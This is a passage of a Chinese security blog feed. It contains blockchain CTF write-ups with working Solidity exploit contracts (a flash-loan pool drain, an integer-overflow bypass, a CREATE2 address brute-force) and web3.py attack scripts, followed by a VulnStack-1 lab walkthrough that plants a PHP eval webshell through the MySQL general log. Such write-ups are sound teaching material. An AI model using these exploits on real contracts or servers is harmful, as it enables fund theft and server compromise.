function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function flashLoan(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    address immutable hacker;</span><br><span class="line">    IPool immutable pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _poolAddr) &#123;</span><br><span class="line">        hacker = msg.sender;</span><br><span class="line">        pool = IPool(_poolAddr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        pool.flashLoan(100 ether);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(hacker).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将远端Setup.sol中的TARGET值(借贷池地址), 传入exp的构造函数中部署好攻击合约, 通过多次调用attack()函数取走池中的资金, 完成题目</p><p>最后贴个web3.py并总结下这个攻击合约的调用过程:</p><p><code>Pool.flashLoan()---&gt;exp.execute()---&gt;Pool.deposit()---&gt;Pool.withdraw()</code></p><p>通过这个流程就把池中的资金转入了攻击合约中, 最后执行<code>payable(hacker).transfer(address(this).balance)</code>将钱汇入钱包, 成功完成这次攻击</p><p>python脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;&quot;</span>))  <span class="comment"># rpc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;连接状态:&quot;</span>, w3.is_connected())</span><br><span class="line"></span><br><span class="line">hacker = <span class="string">&quot;&quot;</span>  <span class="comment"># wallet address</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span>  <span class="comment"># contract address</span></span><br><span class="line">privateKey = <span class="string">&quot;&quot;</span>  <span class="comment"># wallet privateKey</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">sender, func, value=<span class="number">0</span>, gas=<span class="number">0x300000</span></span>):</span><br><span class="line">    txn = func.build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(sender),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: gas,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="number">1.1</span>, <span class="string">&#x27;Gwei&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: w3.to_wei(value, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, privateKey)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;txn_hash=&quot;</span>, txn_hash.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载题目合约</span></span><br><span class="line">abi1 = json.load(<span class="built_in">open</span>(<span class="string">&quot;flash.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">contract1 = w3.eth.contract(abi=abi1, address=w3.to_checksum_address(target))</span><br><span class="line">abi2 = json.load(<span class="built_in">open</span>(<span class="string">&quot;Setup.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">contract2 = w3.eth.contract(abi=abi2, address=w3.to_checksum_address(target))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载攻击合约</span></span><br><span class="line">exp_abi = json.load(<span class="built_in">open</span>(<span class="string">&quot;exp.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]  <span class="comment"># exp</span></span><br><span class="line">exp_bytecode = json.load(<span class="built_in">open</span>(<span class="string">&quot;exp.json&quot;</span>))[<span class="string">&#x27;bytecode&#x27;</span>]</span><br><span class="line">expContract = w3.eth.contract(abi=exp_abi, bytecode=exp_bytecode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 部署攻击合约&quot;</span>)</span><br><span class="line">poolAddr = contract2.functions.TARGET().call()</span><br><span class="line">txnReceipt = run(hacker, expContract.constructor(poolAddr))</span><br><span class="line"><span class="built_in">print</span>(txnReceipt)</span><br><span class="line"></span><br><span class="line">expAddr = txnReceipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 攻击合约部署在&quot;</span>, expAddr)</span><br><span class="line">expContract = w3.eth.contract(abi=exp_abi, address=expAddr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;-----------远程交互exp-----------&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    txn2 = run(hacker, expContract.functions.attack())</span><br><span class="line"></span><br><span class="line">txn1 = contract2.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;题目状态:&quot;</span>, txn1)</span><br></pre></td></tr></table></figure><h2 id="我哪来那么多臭钱？？"><a href="#我哪来那么多臭钱？？" class="headerlink" title="我哪来那么多臭钱？？"></a>我哪来那么多臭钱？？</h2><p>和第一题同样的启动方式</p><p><img src="https://s2.loli.net/2024/12/25/CULM6TIRpABJ2aq.png" alt="1"></p><p>nc连接, 先看下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balance;</span><br><span class="line">    bool public solve;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function Get() public &#123;</span><br><span class="line">        balance[msg.sender] = 50;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">        require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">        require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;);</span><br><span class="line">        require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;);</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(balance[msg.sender] == 114514);</span><br><span class="line">        solve=true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看下目标, 我们需要通过<strong>Transfer()</strong>&#x51FD;数转给账户114514, 再使用这个账户<strong>调用check()</strong>&#x5B8C;成题目</p><p>并且我们注意到一个细节, 本题使用的solidity版本是<strong>0.7.0</strong>, 那么会想到有一些旧版本存在的漏洞, 其中比较重要的就是本题要使用到的<strong>整型溢出</strong>漏洞</p><p>那么完成题目的关键就在这个<strong>Transfer()</strong>&#x51FD;数了, 我们需要绕过层层限制达到我们的目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">    require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">    require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">    require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;);</span><br><span class="line">    require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;);</span><br><span class="line">    balance[msg.sender] -= amount;</span><br><span class="line">    balance[to] += amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于前三行require, 我们就可以利用到上文提到的整型溢出漏洞</p><p>因为对于正常的理解来说, 由于第二个require的限制, 我们必须先调用<strong>Get()</strong>&#x51FD;数先为账户设置一个初始金额50, 但第三个require的限制, 使你转走的金额只能小于50, 无法达到题目要求的114514金额</p><p>但这里就可以通过整型溢出来绕过第三个require, 对于uint256的范围为<code>0-2^256-1</code>在0.8.0版本前, 超出这个范围的值则可以成功溢出, 例如:<strong>如果你给uint256类型的值赋为2^256, 那么最后这个变量的值会溢出为0</strong></p><p>那么同样的, 对于<code>require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;)</code>这个限制, 如果你用<code>balance[msg.sender]</code>减去了一个大于这个值的<code>amount</code>, 那么这个值就会溢出为正数, 即满足这个require语句</p><p>所以在转账步骤, 我们可以直接为一个账户转账114514, 这样也不会在前三个require语句中revert</p><hr><p>接下来重点就要想办法怎么满足这个限制</p><p><code>require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;)</code></p><p>可以看到, 这条语句直接限制了交互者的地址, 必须满足<code>uint160(msg.sender) % (16*16) == 239</code>这个条件, 那我们需要想办法部署一个地址符合条件的攻击合约, 通过攻击合约去调用题目合约的函数才可以</p><p>但是我们怎么能生成一个自定地址的合约呢, 这里就涉及到比较底层的solidity生成地址的原理, 然后根据代码生成地址的逻辑构造出一个能符合条件的地址</p><p>其中solidity计算地址大体上可以分为两种方式, 分别为<strong>create</strong>和<strong>create2</strong>: <a href="https://binschool.app/solidity-advanced/solidity-contract-address.html">https://binschool.app/solidity-advanced/solidity-contract-address.html</a></p><ol><li><p>Create: <code>keccak256(rlp.encode(deployingAddress, nonce))[12:]</code></p></li><li><p>Create2 : <code>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]</code></p></li></ol><p>这里演示下Create2预测出符合条件的地址, 爆破出这个符合条件的salt, 然后通过这个salt部署特定地址的攻击合约</p><p>那么我们可以写一个deployer合约, 用来在一个符合条件的地址上部署我们的攻击合约, 并通过这个攻击合约转给我们的钱包114514, 然后用我们的钱包账户去调用题目的check(), 就可以完成挑战了</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    Challenge immutable target;</span><br><span class="line">    address immutable hacker;</span><br><span class="line"></span><br><span class="line">    constructor(address _challengeAddr, address _hacker) &#123;</span><br><span class="line">        hacker = _hacker;</span><br><span class="line">        target = Challenge(_challengeAddr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        target.Get();</span><br><span class="line">        target.Transfer(hacker, 114514);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor()&#123;&#125;</span><br><span class="line">    function findSalt(address target, address hacker) public view returns (bytes32) &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; type(uint256).max; i++) &#123;</span><br><span class="line">            bytes32 salt = bytes32(i);</span><br><span class="line">            address expAddr = calcAddr(salt, target, hacker);</span><br><span class="line">            if (uint160(expAddr) % (16 * 16) == 239) &#123;</span><br><span class="line">                return salt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(&quot;Suitable salt not found&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calcAddr(bytes32 salt, address target, address hacker) public view returns (address) &#123;</span><br><span class="line">        bytes memory bytecode = abi.encodePacked(type(Exp).creationCode, abi.encode(target, hacker));</span><br><span class="line">        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)));</span><br><span class="line">        return address(uint160(uint256(hash)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes32 salt, address target, address hacker) public returns (address) &#123;</span><br><span class="line">        Exp exp = new Exp&#123;salt: salt&#125;(target, hacker);</span><br><span class="line">        return (address(exp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后总结下调用过程:</p><ol><li>爆出特定盐值, create2部署符合条件地址的合约</li></ol><p><code>Deployer.findSalt()---&gt;Deployer.calcAddr()---&gt;Deployer.deploy(Deployer.findSalt)</code></p><ul><li>在Deployer.calcAddr()算出的地址上调用部署好的攻击合约进行攻击</li></ul><p><code>Exp.attack()---&gt;Challenge.Get()---&gt;Challenge.Transfer()</code></p><ul><li>用收钱的钱包账户调用题目合约, 完成挑战</li></ul><p><code>Challenge.check()---&gt;Challenge.isSolved()</code></p><p>最后再贴一个web3.py的脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;http://156.238.233.21:8545&quot;</span>))  <span class="comment"># rpc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;连接状态:&quot;</span>, w3.is_connected())</span><br><span class="line"></span><br><span class="line">hacker = <span class="string">&quot;&quot;</span>  <span class="comment"># wallet address</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span>  <span class="comment"># contract address</span></span><br><span class="line">privateKey = <span class="string">&quot;&quot;</span>  <span class="comment"># wallet privateKey</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">sender, func, value=<span class="number">0</span>, gas=<span class="number">0x300000</span></span>):</span><br><span class="line">    txn = func.build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(sender),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: gas,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="number">1.1</span>, <span class="string">&#x27;Gwei&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: w3.to_wei(value, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, privateKey)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;txn_hash=&quot;</span>, txn_hash.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载题目合约</span></span><br><span class="line">abi = json.load(<span class="built_in">open</span>(<span class="string">&quot;0xgame.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]  <span class="comment"># 题目</span></span><br><span class="line">contract = w3.eth.contract(abi=abi, address=w3.to_checksum_address(target))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载deployer合约</span></span><br><span class="line">dep_abi = json.load(<span class="built_in">open</span>(<span class="string">&quot;deployer.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">dep_bytecode = json.load(<span class="built_in">open</span>(<span class="string">&quot;deployer.json&quot;</span>))[<span class="string">&#x27;bytecode&#x27;</span>]</span><br><span class="line">depContract = w3.eth.contract(abi=dep_abi, bytecode=dep_bytecode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 部署deploy合约&quot;</span>)</span><br><span class="line">txnReceipt = run(hacker, depContract.constructor())</span><br><span class="line"><span class="built_in">print</span>(txnReceipt)</span><br><span class="line">depAddr = txnReceipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] deploy合约部署在&quot;</span>, depAddr)</span><br><span class="line">depContract = w3.eth.contract(abi=dep_abi, address=w3.to_checksum_address(depAddr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;-----------远程交互deploy-----------&gt;</span></span><br><span class="line">salt = depContract.functions.findSalt(target, hacker).call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 部署特定地址攻击合约&quot;</span>)</span><br><span class="line">deploy = run(hacker, depContract.functions.deploy(salt, target, hacker))</span><br><span class="line"><span class="built_in">print</span>(deploy)</span><br><span class="line">exp_addr = depContract.functions.calcAddr(salt, target, hacker).call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-] 攻击合约部署在&quot;</span>, exp_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载攻击合约</span></span><br><span class="line">exp_abi = json.load(<span class="built_in">open</span>(<span class="string">&quot;exp.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]  <span class="comment"># exp</span></span><br><span class="line">exp_bytecode = json.load(<span class="built_in">open</span>(<span class="string">&quot;exp.json&quot;</span>))[<span class="string">&#x27;bytecode&#x27;</span>]</span><br><span class="line">expContract = w3.eth.contract(abi=exp_abi, bytecode=exp_bytecode, address=w3.to_checksum_address(exp_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;-----------远程交互exp-----------&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 进行攻击&quot;</span>)</span><br><span class="line">attack = run(hacker, expContract.functions.attack())</span><br><span class="line"><span class="built_in">print</span>(attack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;-----------远程交互题目-----------&gt;</span></span><br><span class="line">txn_check = run(hacker, contract.functions.check())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 检查是否完成&quot;</span>)</span><br><span class="line">balance = contract.functions.balance(hacker).call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;账户金额:&quot;</span>, balance)</span><br><span class="line">txn_solve = contract.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;题目状态:&quot;</span>, txn_solve)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack-1</title>
      <link href="/2024/06/08/%E9%9D%B6%E5%9C%BA-VulnStack-1/"/>
      <url>/2024/06/08/%E9%9D%B6%E5%9C%BA-VulnStack-1/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶场下载: <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/56.jpg" alt="1"></p><p>下载后, 解压三个压缩包, 分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm1: windows7---web服务 (双网卡,分别连通外网和内网)</span><br><span class="line">vm2: windows2003---域成员 </span><br><span class="line">vm3: windows Server 2008---DC</span><br></pre></td></tr></table></figure><hr><p><strong>环境配置</strong>:</p><ul><li><p>在VMware 左上角“编辑—&gt;虚拟网络编辑器”添加一段虚拟网络，设置为仅主机<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/55.jpg" alt="1"></p></li><li><p>给Win7外网服务器添加一张网卡，一张网卡为NAT(连通外网)，另一张是我们刚刚添加的VMnat2(连通内网)<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/54.jpg" alt="1"></p></li><li><p>同样的, 内网域控还有域成员网卡都设置为VMnat2<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/53.jpg" alt="1"><br><img src="https://s2.loli.net/2024/06/08/KdLNSpq6MmsE8FI.png" alt="1"></p></li><li><p>设置好后启动机器,密码均为 <code>hongrisec@2019</code>（登录时 提示密码过期需更改密码）<br>登录Win7（外网服务器）打开phpStudy开启服务，这样环境就配置好了（位置：C:\phpStudy\phpStudy.exe）</p></li></ul><p>其中若phpstudy启动失败(固定IP的问题), 可以尝试此解决方式(亲测有效): <a href="https://blog.csdn.net/qq_43871179/article/details/125307581">https://blog.csdn.net/qq_43871179/article/details/125307581</a></p><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>扫描本机网段，端口: <code>nmap -PO 192.168.22.0/24</code>  &#x2F;&#x2F;探测存活ip还有端口<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/69.jpg" alt="1"></p><p>发现开放web服务以及MySQL服务, 访问地址是一个PHP探针(其中透露着网站的绝对路径)<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/68.jpg" alt="1"></p><p>在底部发现MySQL数据库连接<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/67.jpg" alt="1"></p><p>尝试弱口令(root:root)连接, 发现连接成功<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/66.jpg" alt="1"></p><p>接下来进行目录扫描, 发现phpmyadmin目录<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/65.jpg" alt="1"></p><p>那么利用弱口令进入后台, 尝试利用漏洞<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/64.jpg" alt="1"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>phpmyadmin后台getshell有几种方式: <a href="https://cloud.tencent.com/developer/article/2395998">https://cloud.tencent.com/developer/article/2395998</a></p><p>这里选用一种能用的方式进行写入shell(数据库全局日志写入):</p><ul><li><p>查看日志信息 <code>SHOW VARIABLES LIKE &#39;%general%&#39;</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/63.jpg" alt="1"></p></li><li><p>日志读写默认是关闭的，所以我们要打开 <code>SET GLOBAL general_log=&#39;on&#39;;</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/61.jpg" alt="1"></p></li><li><p>将MySQL的通用查询日志（general query log）的输出文件设置为指定的路径 <code>set global general_log_file = &#39;C:/phpStudy/WWW/1.php&#39;</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/60.jpg" alt="1"></p></li><li><p>写入一句话木马 <code>SELECT &#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/59.jpg" alt="1"></p></li><li><p>成功写入<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/58.jpg" alt="1"></p></li><li><p>蚁剑连接,成功上线<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/57.jpg" alt="1"></p></li><li><p>可以顺便进行一下信息收集</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.ipconfig 看所处网段是否有多个</span><br><span class="line">2.netstat -ano 查看网络连接和开放端口</span><br><span class="line">3.net start  查看启动的服务  用于提权</span><br><span class="line">4.tasklist   查看开启的进程</span><br><span class="line">5.tasklist /SVC 复制到在线杀软识别 看存在的杀软情况:https://i.hacking8.com/tiquan</span><br><span class="line">6.ping baidu  看是否可以出网等 </span><br><span class="line">7.net user   存在用户</span><br></pre></td></tr></table></figure><hr><p><strong>漏洞点2</strong>:</p><ul><li><p>在刚才的蚁剑界面, 发现有yxcms存在, 访问看看有无利用点<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/49.jpg" alt="1"><br>这里直接给出了后台…进入看看有无利用点</p></li><li><p>在前台模板处发现可以写入shell<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/51.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/50.jpg" alt="1"><br>具体的上线过程不再赘述</p></li><li><p>此外还存在xss和sql注入等漏洞, 在此也不再赘述</p></li></ul><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>接下来将shell派送给CS或者msf进行下一步渗透</p><h3 id="msf渗透"><a href="#msf渗透" class="headerlink" title="msf渗透"></a>msf渗透</h3><h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><ul><li>使用msf生成exe shell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 